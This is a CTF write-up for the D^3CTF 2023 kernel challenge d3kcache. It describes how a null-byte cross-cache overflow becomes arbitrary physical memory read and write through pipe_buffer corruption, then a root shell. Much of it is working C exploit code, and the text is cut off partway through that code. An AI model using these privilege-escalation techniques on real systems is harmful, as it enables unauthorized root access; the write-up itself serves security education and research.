# [D^3CTF 2023] d3kcache:  From null-byte cross-cache overflow to infinite arbitrary read & write in physical memory space.

# 0x00. Before we start

It may be my last time to design the Pwn challenge for [D^3CTF](https://d3ctf.io/) before my undergraduate graduation. Although I have always wanted to come up with some good challenges, I have been too inexperienced to create anything particularly outstanding. I hope that this time I can bring you with something special : ) 

The challenge comes from the question that I'm always thinking about:

- As a hacker, how extreme the environment is can we  still complete the exploitation to the vulnerabilities?  Can we develop a **universal exploitation** that is not just the ideal one in lab environment but the powerful one that can be applied to the real-world vulnerabilities?

Google has shown us how to turn a 2-byte heap-out-of-bound vulnerability into a universal solution in [CVE-2021-22555](https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html). BitsByWill demonstrated the powerful page-level heap Feng Shui that can break the isolation between `kmem_cache` in [corCTF2022](https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html) . D3v17 archive the privilege escalation with only a single null-byte heap overflow vulnerability using the [poll_list](https://syst3mfailure.io/corjail/), and Kylebot converted it into a cross-cache overflow exploit using the [unlinking attack](https://www.starlabs.sg/blog/2022/06-io_uring-new-code-new-bugs-and-a-new-exploit-technique/#unlinking-attack). So, what's next?

- If the size of the struct where the vulnerability located is not appropriate, or the struct itself cannot help us exploit the vulnerability, we have to use struct like `msg_msg` to adapt. But such kernel struct is rare with many limitations in exploit(e.g. they're usually with a troublesome header).
- If the vulnerability exists in a standalone `kmem_cache`, we cannot exploit it with other struct's help directly. The cross-cache overflow may be the only way to achive.
- If we get only 1-byte overflow in vulnerability, or the system V IPC is banned, we cannot apply Google's solution to construct a use-after-free.
- If the memory is small, or the variables like `modprobe_path` is a static value, Kylebot's unlink attack is  no longer available.
- Though the D3v17's `poll_list` may still be available, the first-level `poll_list` is always in order-3 pages. If the vulnerability located in other-size slab (e.g. order-0 pages), we must resort to more granular page-level heap Feng Shui, **where inter-order Feng Shui will greatly reduce the success rate.**
- **If the kernel has Control Flow Integrity enabled, or if we don't even know the kernel image information, traditional ROP methods are essentially dead.**

In such extreme conditions, can we still find a universal solution to exploit kernel vulnerabilities? This was my original idea when creating this challenge. :)

# 0x01.Analysis

There's no doubt that it's easy to reverse the kernel module I provided. It create an isolate `kmem_cache` that  can allocate objects in size 2048.

```c
#define KCACHE_SIZE 2048

static int d3kcache_module_init(void)
{
    //...

    kcache_jar = kmem_cache_create_usercopy("kcache_jar", KCACHE_SIZE, 0, 
                         SLAB_HWCACHE_ALIGN | SLAB_PANIC | SLAB_ACCOUNT, 
                         0, KCACHE_SIZE, NULL);

    memset(kcache_list, 0, sizeof(kcache_list));

    return 0;
}
```

The custom `d3kcache_ioctl()`  function provides a menu for allocating, appending, freeing, and reading objects from `kcache_jar` , and the vulnerability is just in appending data, where there is a null-byte buffer overflow  when writing surpasses 2048 bytes.

```c
long d3kcache_ioctl(struct file *__file, unsigned int cmd, unsigned long param)
{
    //...

    switch (cmd) {
        //...
        case KCACHE_APPEND:
            if (usr_cmd.idx < 0 || usr_cmd.idx >= KCACHE_NUM 
                || !kcache_list[usr_cmd.idx].buf) {
                printk(KERN_ALERT "[d3kcache:] Invalid index to write.");
                break;
            }

            if (usr_cmd.sz > KCACHE_SIZE || 
                (usr_cmd.sz + kcache_list[usr_cmd.idx].size) >= KCACHE_SIZE) {
                size = KCACHE_SIZE - kcache_list[usr_cmd.idx].size;
            } else {
                size = usr_cmd.sz;
            }

            kcache_buf = kcache_list[usr_cmd.idx].buf;
            kcache_buf += kcache_list[usr_cmd.idx].size;

            if (copy_from_user(kcache_buf, usr_cmd.buf, size)) {
                break;
            }

            kcache_buf[size] = '\0'; /* vulnerability */

            retval = 0;
            break;
            //...
```

We can also find that the Control Flow Integrity is enabled while checking the `config` file provided.

```
CONFIG_CFI_CLANG=y
```

# 0x02. Exploitation

As the `kmem_cache` is an isolate one, we cannot allocate other regular kernel structs from it, so the **cross-cache overflow** is the only solution at the very beginning.

## Step.I - Use page-level heap Feng Shui to construct a stable cross-cache overflow.

To ensure stability of the overflow, we use the page-level heap Feng Shui there to construct a **overflow layout**. 

### How it works

Page-level heap Feng Shui is a technique that is not really new, but rather a somewhat new utilization technique. As the name suggests, page-level heap Feng Shui is the memory re-arrangement technique with the granularity of memory pages. The current layout of memory pages in kernel is not only unknown to us but also has a huge amount of information, so the technique is **to construct a new known and controlable page-level granularity memory page layout manually.**

How can we achieve that? Let's rethink about the process how the slub allocator requests pages from buddy system. When the slab pages it use as the freelist has run out and the partial list of `kmem_cache_node`  is empty, or it's the first time to allocate, the slub allocator will request pages from buddy system.

![image.png](https://s2.loli.net/2023/01/19/yPtXiwzVfxWH7lE.png)

The next one we need to rethink about is how the buddy system allocates pages. It takes the `2^order` memory pages as the granularity of allocation and the free pages in different order are in different linked lists. While the list of allocated order cannot provide the free pages, the one from list of higher order will be divided into two parts: one for the caller and the other return to corresponding list. The following figure shows how the buddy system works actually.

![page.gif](https://s2.loli.net/2023/01/19/79biltjNfACIZcP.gif)

Notice that the two low-order continuous memory pages obtained by splitting them from a higher-order are **physically contiguous**. Thus, we can:

- Request two continuous memory pages from the buddy system.v
- Release one of the memory pages, do the heap spraying on **vulnerable**  `kmem_cache`, which will make it take away this memory pages.
- Release the other memory page, do the heap spraying on **victim**  `kmem_cache`, which will make it take away this memory pages.

Now the vulnerable and victim `kmem_cache` both hold the memory pages that are near by each other's one, which allow us to achive the **cross-cache overflow.**

### How we exploit

There're many kernel APIs that can request pages directly from the buddy system. Here we'll use the solution from  [CVE-2017-7308](https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html).

When we create a socket with the  `PF_PACKET` protocol, call the  `setsockopt()` to set the  `PACKET_VERSION` as `TPACKET_V1 `/ `TPACKET_V2` , and hand in a  `PACKET_TX_RING` by  `setsockopt()` , there is a call chain like this:

```c
__sys_setsockopt()
    sock->ops->setsockopt()
    	packet_setsockopt() // case PACKET_TX_RING ↓
    		packet_set_ring()
    			alloc_pg_vec()
```

A `pgv` struct will be allocated to allocate `tp_block_nr` parts of `2^order` memory pages,  where the `order` is determined by `tp_block_size`:

```c
static struct pgv *alloc_pg_vec(struct tpacket_req *req, int order)
{
	unsigned int block_nr = req->tp_block_nr;
	struct pgv *pg_vec;
	int i;

	pg_vec = kcalloc(block_nr, sizeof(struct pgv), GFP_KERNEL | __GFP_NOWARN);
	if (unlikely(!pg_vec))
		goto out;

	for (i = 0; i < block_nr; i++) {
		pg_vec[i].buffer = alloc_one_pg_vec_page(order);
		if (unlikely(!pg_vec[i].buffer))
			goto out_free_pgvec;
	}

out:
	return pg_vec;

out_free_pgvec:
	free_pg_vec(pg_vec, order, block_nr);
	pg_vec = NULL;
	goto out;
}
```

The  `alloc_one_pg_vec_page()` will call the  `__get_free_pages()` to request pages from buddy system, which allow us to acquire tons of pages in different order:

```c
static char *alloc_one_pg_vec_page(unsigned long order)
{
	char *buffer;
	gfp_t gfp_flags = GFP_KERNEL | __GFP_COMP |
			  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;

	buffer = (char *) __get_free_pages(gfp_flags, order);
	if (buffer)
		return buffer;
	//...
}
```

Correspondingly the pages in `pgv` will be released after the socket is closed.

```c
packet_release()
    packet_set_ring()
    	free_pg_vec()
```

Such features in  `setsockopt()`  allow us to achieve the **page-level heap Feng Shui.** Note that we should avoid those noisy objects (additional memory allocation) corruptting our page-level heap layout. Thus what we should do is to pre-allocate some pages before we allocate the pages for page-level heap Feng Shui. **As the buddy system is a LIFO poo**l, we can free these pre-allocated pages when the slab is being running out.

Thus, **we can obtain the page-level control over a continuous block of memory**, which allow us to construct a special memory layout within follow steps:

- First, release a portion of the pages so that the victim object obtains these pages.
- Then, release a block of pages and do the allocation on the kernel module, making it request this block from the buddy system.
- Finally, release another portion of the pages so that the victim object obtains these pages.

As a result, the vulnerable slab pages will be around with the victim objects' slab pages as the figure shown, which ensure the stablity of cross-cache overflow.

![cross-cache overflow layout](https://s2.loli.net/2023/05/02/VvPk5nKYmDCWxOs.png)

## Step.II - Use fcntl(F\_SETPIPE\_SZ) to extend pipe\_buffer, construct page-level UAF

Now let's consider the victim object as the target of cross-cache overflow. I believe that the powerful `msg_msg` is the first one that comes to everyone's mind. But we've use `msg_msg` for too many times in the past exploitation on many vulnerabilities. So I'd like to explore somthing new this time. : )

![BGM:What is love](https://s2.loli.net/2023/05/03/EIrSicx56qHLC1X.png)

Due to the only one-byte overflow, there's no doubt that we should find those structs with pointers pointing to some other kernel objects in their header. The `pipe_buffer` is such a good boy with a pointer pointing to a struct `page` at the beginning of it. What's more is that the size of struct `page` is only `0x40`, and a null-byte overflow can set a byte to `\x00`, which means that **we can make a** `pipe_buffer` **point to another page with a 75% probability.** 

So if we spray `pipe_buffer` and do the null-byte cross-cache overflow on it, there's a high probability to **make two** `pipe_buffer` **point to the same struct** `page`. When we release one of them, **we'll get a page-level use-after-free**. It's as shown in following figures.

![original state](https://s2.loli.net/2023/05/02/JLZOKejgoPdTkYA.png)

![null-byte partial overwrite](https://s2.loli.net/2023/05/02/MwTSWUbeaY9Puro.png)

![page-level UAF](https://s2.loli.net/2023/05/02/R3reNIAT1lG7sfw.png)

What's more is that the function of pipe itself **allow us to read and write this UAF page.** I don't know whether there's another good boy can do the same as the `pipe` does :  )

But there's another problem, the `pipe_buffer` comes from the `kmalloc-cg-1k` pool, which requests order-2 pages, and the vulnerable kernel module requests the order-3 ones. If we perform the heap Feng Shui between dirfferent order directly, the success rate of the exploit will be greatly reduced :(

Luckily the `pipe` is much more powerful than I've ever imagined. We've known that the `pipe_buffer` we said is actually an array of struct `pipe_buffer` and the number of it is `pipe_bufs` .

```c
struct pipe_inode_info *alloc_pipe_info(void)
{
	//...

	pipe->bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer),
			     GFP_KERNEL_ACCOUNT);
```

Note that the number of struct `pipe_buffer` **is not a constant**, we may come up with a question: **can we resize the number of** `pipe_buffer` **in the array?** The answer is yes. We can use `fcntl(F_SETPIPE_SZ)` to **acjust the number of** `pipe_buffer` **in the array**, which is a re-allocation in fact.

```c
long pipe_fcntl(struct file *file, unsigned int cmd, unsigned long arg)
{
	struct pipe_inode_info *pipe;
	long ret;

	pipe = get_pipe_info(file, false);
	if (!pipe)
		return -EBADF;

	__pipe_lock(pipe);

	switch (cmd) {
	case F_SETPIPE_SZ:
		ret = pipe_set_size(pipe, arg);
//...

static long pipe_set_size(struct pipe_inode_info *pipe, unsigned long arg)
{
	//...

	ret = pipe_resize_ring(pipe, nr_slots);

//...

int pipe_resize_ring(struct pipe_inode_info *pipe, unsigned int nr_slots)
{
	struct pipe_buffer *bufs;
	unsigned int head, tail, mask, n;

	bufs = kcalloc(nr_slots, sizeof(*bufs),
		       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);
```

Thus, we can easily **reallocate the number of** `pipe_buffer` to do a re-allocation: for each pipe, we'd like to **allocate 64** `pipe_buffer`, **making it request an order-3 page from** `kmalloc-cg-2k`, which is the same order as the vulnerable kernel module. So that the cross-cache overflow is in a high reliability.

Note that the size of struct `page` is `0x40`, which means that the last byte of a pointer pointing to it can be `\x00`. If we make a cross-cache overflow on such `pipe_buffer`, it's equal to nothing happen. So the actual rate of a successful exploitation is only 75% :  (

## Step.III - Construct self-writing pipes to achive the arbitrary read & write

As the `pipe` itself provide us with the ability to do the read and write to specific page, and the size of `pipe_buffer` array can be control by us, it couldn't be better to choose the `pipe_buffer` as the victim object again on the UAF page :  )

![image.png](https://s2.loli.net/2023/05/02/lfmP8ZxicbjBNSR.png)

As the `pipe_buffer` on the UAF page can be read & write by us, we can just simply apply the [pipe primitive](https://github.com/veritas501/pipe-primitive) to perform the **dirty pipe** (That's also how the NU1L team did to solve it). 

But as the `pipe_buffer` on the UAF page can be read & write by us, **why shouldn't we construct a second-level page-level UAF like this?**

![secondary page-level UAF](https://s2.loli.net/2023/05/02/yhNuT7kBj58K6gt.png)

Why? The `page` struct  comes from a continuous array in fact, and each of them is related to a physical page. If we can tamper with a `pipe_buffer` 's pointer to the struct `page`, **we can perform the arbitrary read and write in the whole memory space**. I'll show you how to do it now :  )

As the address of one `page` struct can be read by the UAF pipe (we can write some bytes before the exploitatino starts), we can easily overwrite another `pipe_buffer` 's pointer to this page to. We call it as the **second-level UAF page**. Then we close one of the pipe to free the page, spray the `pipe_buffer` on this page again. **As the address of this page is known to us, we can tamper with the** `pipe_buffer` **on the page pointing to the page ie located directly, which allow the** `pipe_buffer` **on the second-level UAF page to tamper with itself**. 

![third-level self-pointing pipe](https://s2.loli.net/2023/05/02/TYr8WlEushem2i3.png)

We can tamper with  `pipe_buffer.offset` and `pipe_buffer.len` there to relocate the start point of a pipe's read and write, but these variables will be reassigned after the read & write operation. So we use **three such self-pointing pipe** there to perform an infinite loop:

- The first pipe is used to do the arbitrary read and write in memory space by tampering with its pointer to the `page` struct.
- The second pipe is used to change the start point of the third pipe, so that the third pipe cam tamper with the first and the second pipe.
- The third pipe is used to tamper with the first and the second pipe, so that the first pipe can read & write arbitrary physical page, and the second pipe can be used to tamper with the third pipe.

With three self-pointing pipe like that, we can perform **infinite arbitrary read and write in the whole memory space** :  )

## Step.IV - Privilege escalation

With the ability to do the infinite arbitrary read and write in the whole memory space, we can escalate the privilege in many different ways. Here i'll give out three meothds to do so.

### Method 1. Change the cred of current task\_struct to init\_cred

The `init_cred` is the `cred` with root privilege. If we can change current process's `task_struct.cred` to it, we can obtain the root privilege. We can simply change the  `task_struct.comm` by  `prctl(PR_SET_NAME, "arttnba3pwnn");` and search for the `task_struct` by the arbitrary read directly.

Sometimes the `init_cred` is not exported in  `/proc/kallsyms` and the base address of it is hard for us to get while debugging. Luckily all the `tasj_struct` forms a tree and we can easily find the `init` 's `task_struct` along the tree and get the address of `init_cred` .

![image.png](https://s2.loli.net/2023/05/02/jO5GwFnmSxkr3fg.png)

### Methord 2. Read the page table to resolve the physical address of kernel stack , write the kernel stack directly to perform the ROP

Though the CFI is enabled, **we can still perform the code execution**. As the address of current process's page table can be obtained from the `mm_struct`, and the address of `mm_struct` and kernel stack can be obtained from the `task_struct` , we can easily resolve out the physical address of kernel stack and get the corresponding `page` struct. Thus we can write the ROP gadget directly on `pipe_write()` 's stack.

![image.png](https://s2.loli.net/2023/05/02/sRVcEax3wHApBW2.png)

But this solution is not always available. Sometimes the control flow won't be hijacked after the ROP gadgets are written into the kernel stack page. I don't know the reason why it happened yet :  (

### Method 3. Read the page table to resolve the physical address of kernel code, map it to the user space to overwrite the kernel code(USMA)

It may also be a good way to overwrite the kernel code segment to perform the arbitrary code execution, but the `pipe` actually writes a page by the direct mapping area, **where the kernel code area is read-only.**

But what we want to do in fact is to **write the corresponding physical page**, and the page table is writable. So **we can simply tamper with the page table to establish a new mapping to kernel code's physical pages** :  ) 

This is actually the same way as the [USMA](https://i.blackhat.com/Asia-22/Thursday-Materials/AS-22-YongLiu-USMA-Share-Kernel-Code.pdf) does.

![image.png](https://s2.loli.net/2023/05/02/U3BEbFTsZiy48NQ.png)

## Final Exploitation

Here is the final code for the explotation with three different ways to obtain the root privilege. **The totabl reliability is about 75%.**

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sched.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/mman.h>

/**
 * I - fundamental functions
 * e.g. CPU-core binder, user-status saver, etc.
 */

size_t kernel_base = 0xffffffff81000000, kernel_offset = 0;
size_t page_offset_base = 0xffff888000000000, vmemmap_base = 0xffffea0000000000;
size_t init_task, init_nsproxy, init_cred;

size_t direct_map_addr_to_page_addr(size_t direct_map_addr)
{
    size_t page_count;

    page_count = ((direct_map_addr & (~0xfff)) - page_offset_base) / 0x1000;
    
    return vmemmap_base + page_count * 0x40;
}

void err_exit(char *msg)
{
    printf("\033[31m\033[1m[x] Error at: \033[0m%s\n", msg);
    sleep(5);
    exit(EXIT_FAILURE);
}

/* root checker and shell poper */
void get_root_shell(void)
{
    if(getuid()) {
        puts("\033[31m\033[1m[x] Failed to get the root!\033[0m");
        sleep(5);
        exit(EXIT_FAILURE);
    }

    puts("\033[32m\033[1m[+] Successful to get the root. \033[0m");
    puts("\033[34m\033[1m[*] Execve root shell now...\033[0m");
    
    system("/bin/sh");
    
    /* to exit the process normally, instead of segmentation fault */
    exit(EXIT_SUCCESS);
}

/* userspace status saver */
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
}

/* bind the process to specific core */
void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("\033[34m\033[1m[*] Process binded to core \033[0m%d\n", core);
}

/**
 * @brief create an isolate namespace
 * note that the caller **SHOULD NOT** be used to get the root, but an operator
 * to perform basic exploiting operations in it only
 */
void unshare_setup(void)
{
    char edit[0x100];
    int tmp_fd;

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    tmp_fd = open("/proc/self/setgroups", O_WRONLY);
    write(tmp_fd, "deny", strlen("deny"));
    close(tmp_fd);

    tmp_fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getuid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);

    tmp_fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getgid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
}

struct page;
struct pipe_inode_info;
struct pipe_buf_operations;

/* read start from len to offset, write start from offset */
struct pipe_buffer {
	struct page *page;
	unsigned int offset, len;
	const struct pipe_buf_operations *ops;
	unsigned int flags;
	unsigned long private;
};

struct pipe_buf_operations {
	/*
	 * ->confirm() verifies that the data in the pipe buffer is there
	 * and that the contents are good. If the pages in the pipe belong
	 * to a file system, we may need to wait for IO completion in this
	 * hook. Returns 0 for good, or a negative error value in case of
	 * error.  If not present all pages are considered good.
	 */
	int (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);

	/*
	 * When the contents of this pipe buffer has been completely
	 * consumed by a reader, ->release() is called.
	 */
	void (*release)(struct pipe_inode_info *, struct pipe_buffer *);

	/*
	 * Attempt to take ownership of the pipe buffer and its contents.
	 * ->try_steal() returns %true for success, in which case the contents
	 * of the pipe (the buf->page) is locked and now completely owned by the
	 * caller. The page may then be transferred to a different mapping, the
	 * most often used case is insertion into different file address space
	 * cache.
	 */
	int (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);

	/*
	 * Get a reference to the pipe buffer.
	 */
	int (*get)(struct pipe_inode_info *, struct pipe_buffer *);
};

/**
 * II - interface to interact with /dev/kcache
 */
#define KCACHE_SIZE 2048
#define KCACHE_NUM 0x10

#define KCACHE_ALLOC 0x114
#define KCACHE_APPEND 0x514
#define KCACHE_READ 0x1919
#define KCACHE_FREE 0x810

struct kcache_cmd {
    int idx;
    unsigned int sz;
    void *buf;
};

int dev_fd;

int kcache_alloc(int index, unsigned int size, char *buf)
{
    struct kcache_cmd cmd = {
        .idx = index,
        .sz = size,
        .buf = buf,
    };

    return ioctl(dev_fd, KCACHE_ALLOC, &cmd);
}

int kcache_append(int index, unsigned int size, char *buf)
{
    struct kcache_cmd cmd = {
        .idx = index,
        .sz = size,
        .buf = buf,
    };

    return ioctl(dev_fd, KCACHE_APPEND, &cmd);
}

int kcache_read(int index, unsigned int size, char *buf)
{
    struct kcache_cmd cmd = {
        .idx = index,
        .sz = size,
        .buf = buf,
    };

    return ioctl(dev_fd, KCACHE_READ, &cmd);
}

int kcache_free(int index)
{
    struct kcache_cmd cmd = {
        .idx = index,
    };

    return ioctl(dev_fd, KCACHE_FREE, &cmd);
}

/**
 * III -  pgv pages sprayer related 
 * not that we should create two process:
 * - the parent is the one to send cmd and get root
 * - the child creates an isolate userspace by calling unshare_setup(),
 *      receiving cmd from parent and operates it only
 */
#define PGV_PAGE_NUM 1000
#define PACKET_VERSION 10
#define PACKET_TX_RING 13

struct tpacket_req {
    unsigned int tp_block_size;
    unsigned int tp_block_nr;
    unsigned int tp_frame_size;
    unsigned int tp_frame_nr;
};

/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */
struct pgv_page_request {
    int idx;
    int cmd;
    unsigned int size;
    unsigned int nr;
};

/* operations type */
enum {
    CMD_ALLOC_PAGE,
    CMD_FREE_PAGE,
    CMD_EXIT,
};

/* tpacket version for setsockopt */
enum tpacket_versions {
    TPACKET_V1,
    TPACKET_V2,
    TPACKET_V3,
};

/* pipe for cmd communication */
int cmd_pipe_req[2], cmd_pipe_reply[2];

/* create a socket and alloc pages, return the socket fd */
int create_socket_and_alloc_pages(unsigned int size, unsigned int nr)
{
    struct tpacket_req req;
    int socket_fd, version;
    int ret;

    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
    if (socket_fd < 0) {
        printf("[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n");
        ret = socket_fd;
        goto err_out;
    }

    version = TPACKET_V1;
    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, 
                     &version, sizeof(version));
    if (ret < 0) {
        printf("[x] failed at setsockopt(PACKET_VERSION)\n");
        goto err_setsockopt;
    }

    memset(&req, 0, sizeof(req));
    req.tp_block_size = size;
    req.tp_block_nr = nr;
    req.tp_frame_size = 0x1000;
    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req));
    if (ret < 0) {
        printf("[x] failed at setsockopt(PACKET_TX_RING)\n");
        goto err_setsockopt;
    }

    return socket_fd;

err_setsockopt:
    close(socket_fd);
err_out:
    return ret;
}

/* the parent process should call it to send command of allocation to child */
int alloc_page(int idx, unsigned int size, unsigned int nr)
{
    struct pgv_page_request req = {
        .idx = idx,
        .cmd = CMD_ALLOC_PAGE,
        .size = size,
        .nr = nr,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(struct pgv_page_request));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}

/* the parent process should call it to send command of freeing to child */
int free_page(int idx)
{
    struct pgv_page_request req = {
        .idx = idx,
        .cmd = CMD_FREE_PAGE,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(req));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    usleep(10000);

    return ret;
}

/* the child, handler for commands from the pipe */
void spray_cmd_handler(void)
{
    struct pgv_page_request req;
    int socket_fd[PGV_PAGE_NUM];
    int ret;

    /* create an isolate namespace*/
    unshare_setup();

    /* handler request */
    do {
        read(cmd_pipe_req[0], &req, sizeof(req));

        if (req.cmd == CMD_ALLOC_PAGE) {
            ret = create_socket_and_alloc_pages(req.size, req.nr);
            socket_fd[req.idx] = ret;
        } else if (req.cmd == CMD_FREE_PAGE) {
            ret = close(socket_fd[req.idx]);
        } else {
            printf("[x] invalid request: %d\n", req.cmd);
        }

        write(cmd_pipe_reply[1], &ret, sizeof(ret));
    } while (req.cmd != CMD_EXIT);
}

/* init pgv-exploit subsystem :) */
void prepare_pgv_system(void)
{
    /* pipe for pgv */
    pipe(cmd_pipe_req);
    pipe(cmd_pipe_reply);
    
    /* child process for pages spray */
    if (!fork()) {
        spray_cmd_handler();
    }
}

/**
 * IV - config for page-level heap spray and heap fengshui
 */
#define PIPE_SPRAY_NUM 200

#define PGV_1PAGE_SPRAY_NUM 0x20

#define PGV_4PAGES_START_IDX PGV_1PAGE_SPRAY_NUM
#define PGV_4PAGES_SPRAY_NUM 0x40

#define PGV_8PAGES_START_IDX (PGV_4PAGES_START_IDX + PGV_4PAGES_SPRAY_NUM)
#define PGV_8PAGES_SPRAY_NUM 0x40

int pgv_1page_start_idx = 0;
int pgv_4pages_start_idx = PGV_4PAGES_START_IDX;
int pgv_8pages_start_idx = PGV_8PAGES_SPRAY_NUM;

/* spray pages in different size for various usages */
void prepare_pgv_pages(void)
{
    /**
     * We want a more clear and continuous memory there, which require us to 
     * make the noise less in allocating order-3 pages.
     * So we pre-allocate the pages for those noisy objects there.
     */
    puts("[*] spray pgv order-0 pages...");
    for (int i = 0; i < PGV_1PAGE_SPRAY_NUM; i++) {
        if (alloc_page(i, 0x1000, 1) < 0) {
            printf("[x] failed to create %d socket for pages spraying!\n", i);
        }
    }

    puts("[*] spray pgv order-2 pages...");
    for (int i = 0; i < PGV_4PAGES_SPRAY_NUM; i++) {
        if (alloc_page(PGV_4PAGES_START_IDX + i, 0x1000 * 4, 1) < 0) {
            printf("[x] failed to create %d socket for pages spraying!\n", i);
        }
    }

    /* spray 8 pages for page-level heap fengshui */
    puts("[*] spray pgv order-3 pages...");
    for (int i = 0; i < PGV_8PAGES_SPRAY_NUM; i++) {
        /* a socket need 1 obj: sock_inode_cache, 19 objs for 1 slub on 4 page*/
        if (i % 19 == 0) {
            free_page(pgv_4pages_start_idx++);
        }

        /* a socket need 1 dentry: dentry, 21 objs for 1 slub on 1 page */
        if (i % 21 == 0) {
            free_page(pgv_1page_start_idx += 2);
        }

        /* a pgv need 1 obj: kmalloc-8, 512 objs for 1 slub on 1 page*/
        if (i % 512 == 0) {
            free_page(pgv_1page_start_idx += 2);
        }

        if (alloc_page(PGV_8PAGES_START_IDX + i, 0x1000 * 8, 1) < 0) {
            printf("[x] failed to create %d socket for pages spraying!\n", i);
        }
    }

    puts("");
}

/* for pipe escalation */
#define SND_PIPE_BUF_SZ 96
#define TRD_PIPE_BUF_SZ 192

int pipe_fd[PIPE_SPRAY_NUM][2];
int orig_pid = -1, victim_pid = -1;
int snd_orig_pid = -1, snd_vicitm_pid = -1;
int self_2nd_pipe_pid = -1, self_3rd_pipe_pid = -1, self_4th_pipe_pid = -1;

struct pipe_buffer info_pipe_buf;

int extend_pipe_buffer_to_4k(int start_idx, int nr)
{
    for (int i = 0; i < nr; i++) {
        /* let the pipe_buffer to be allocated on order-3 pages (kmalloc-4k) */
        if (i % 8 == 0) {
            free_page(pgv_8pages_start_idx++);
        }

        /* a pipe_buffer on 1k is for 16 pages, so 4k for 64 pages */
        if (fcntl(pipe_fd[start_idx + i][1], F_SETPIPE_SZ, 0x1000 * 64) < 0) {
            printf("[x] failed to extend %d pipe!\n", start_idx + i);
            return -1;
        }
    }

    return 0;
}

/**
 *  V - FIRST exploit stage - cross-cache overflow to make page-level UAF
*/

void corrupting_first_level_pipe_for_page_uaf(void)
{
    char buf[0x1000];

    puts("[*] spray pipe_buffer...");
    for (int i = 0; i < PIPE_SPRAY_NUM; i ++) {

        if (pipe(pipe_fd[i]) < 0) {
            printf("[x] failed to alloc %d pipe!", i);
            err_exit("FAILED to create pipe!");
        }
    }

    /* spray pipe_buffer on order-2 pages, make vul-obj slub around with that.*/

    puts("[*] exetend pipe_buffer...");
    if (extend_pipe_buffer_to_4k(0, PIPE_SPRAY_NUM / 2) < 0) {
        err_exit("FAILED to extend pipe!");
    }

    puts("[*] spray vulnerable 2k obj...");
    free_page(pgv_8pages_start_idx++);
    for (int i = 0; i < KCACHE_NUM; i++) {
        kcache_alloc(i, 8, "arttnba3");
    }

    puts("[*] exetend pipe_buffer...");
    if (extend_pipe_buffer_to_4k(PIPE_SPRAY_NUM / 2, PIPE_SPRAY_NUM / 2) < 0) {
        err_exit("FAILED to extend pipe!");
    }

    puts("[*] allocating pipe pages...");
    for (int i = 0; i < PIPE_SPRAY_NUM; i++) {
        write(pipe_fd[i][1], "arttnba3", 8);
        write(pipe_fd[i][1], &i, sizeof(int));
        write(pipe_fd[i][1], &i, sizeof(int));
        write(pipe_fd[i][1], &i, sizeof(int));
        write(pipe_fd[i][1], "arttnba3", 8);
        write(pipe_fd[i][1], "arttnba3", 8);  /* prevent pipe_release() */
    }

    /* try to trigger cross-cache overflow */
    puts("[*] trigerring cross-cache off-by-null...");
    for (int i = 0; i < KCACHE_NUM; i++) {
        kcache_append(i, KCACHE_SIZE - 8, buf);
    }

    /* checking for cross-cache overflow */
    puts("[*] checking for corruption...");
    for (int i = 0; i < PIPE_SPRAY_NUM; i++) {
        char a3_str[0x10];
        int nr;

        memset(a3_str, '\0', sizeof(a3_str));
        read(pipe_fd[i][0], a3_str, 8);
        read(pipe_fd[i][0], &nr, sizeof(int));
        if (!strcmp(a3_str, "arttnba3") && nr != i) {
            orig_pid = nr;
            victim_pid = i;
            printf("\033[32m\033[1m[+] Found victim: \033[0m%d "
                   "\033[32m\033[1m, orig: \033[0m%d\n\n", 
                   victim_pid, orig_pid);
            break;
        }
    }

    if (victim_pid == -1) {
        err_exit("FAILED to corrupt pipe_buffer!");
    }
}

void corrupting_second_level_pipe_for_pipe_uaf(void)
{
    size_t buf[0x1000];
    size_t snd_pipe_sz = 0x1000 * (SND_PIPE_BUF_SZ/sizeof(struct pipe_buffer));

    memset(buf, '\0', sizeof(buf));

    /* let the page's ptr at pipe_buffer */
    write(pipe_fd[victim_pid][1], buf, SND_PIPE_BUF_SZ*2 - 24 - 3*sizeof(int));

    /* free orignal pipe's page */
    puts("[*] free original pipe...");
    close(pipe_fd[orig_pid][0]);
    close(pipe_fd[orig_pid][1]);

    /* try to rehit victim page by reallocating pipe_buffer */
    puts("[*] fcntl() to set the pipe_buffer on victim page...");
    for (int i = 0; i < PIPE_SPRAY_NUM; i++) {
        if (i == orig_pid || i == victim_pid) {
            continue;
        }

